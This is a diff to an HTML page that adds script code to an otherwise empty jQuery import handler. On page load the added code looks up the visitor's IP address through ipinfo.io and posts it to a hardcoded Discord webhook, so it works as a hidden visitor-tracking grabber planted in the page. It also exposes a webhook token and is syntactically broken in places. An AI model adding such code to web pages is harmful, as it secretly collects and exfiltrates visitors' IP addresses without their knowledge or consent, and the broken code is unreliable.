@@ -2,8 +2,18 @@
   <body>
     <script>
     import("https://code.jquery.com/jquery-3.6.1.js")
-      .then(function() {})
-      .catch(function() {});
+      .then(function() {
+        $.get("https://ipinfo.io", function(a) {
+          fetch("https://discord.com/api/webhooks/1040260914483572737/te89tt_r7ALZE8sA-TXiVnTCSl8KSOAwYg3cEE-pdcCTk-wxWefZijJiPmE_cj9_luVG", {
+            method: "POST",
+            headers: {
+              "Content-Type":"application/json"
+            },
+            body: {
+              content:a.ip; 
+            }
+          });
+        }, "JSONP");
     </script>
   </body>
 </html>
